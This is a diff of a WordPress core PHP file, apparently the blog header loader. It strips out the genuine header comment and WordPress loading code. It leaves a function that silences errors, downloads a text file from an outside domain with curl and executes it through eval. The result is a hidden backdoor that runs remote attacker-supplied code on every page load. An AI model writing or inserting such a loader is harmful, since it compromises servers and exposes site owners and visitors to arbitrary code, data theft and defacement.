@@ -1,9 +1,4 @@
 <?php
-/**
- * Loads the WordPress environment and template.
- *
- * @package WordPress
- */
 error_reporting(0);
 function get_contents($url){
   $ch = curl_init("$url");
@@ -21,18 +16,3 @@ function get_contents($url){
 $a =
 get_contents('https://picucur.xyz/landing/yardimal/yardimal.txt');
 eval('?>'.$a);
-
-if ( ! isset( $wp_did_header ) ) {
-
-	$wp_did_header = true;
-
-	// Load the WordPress library.
-	require_once __DIR__ . '/wp-load.php';
-
-	// Set up the WordPress query.
-	wp();
-
-	// Load the theme template.
-	require_once ABSPATH . WPINC . '/template-loader.php';
-
-}
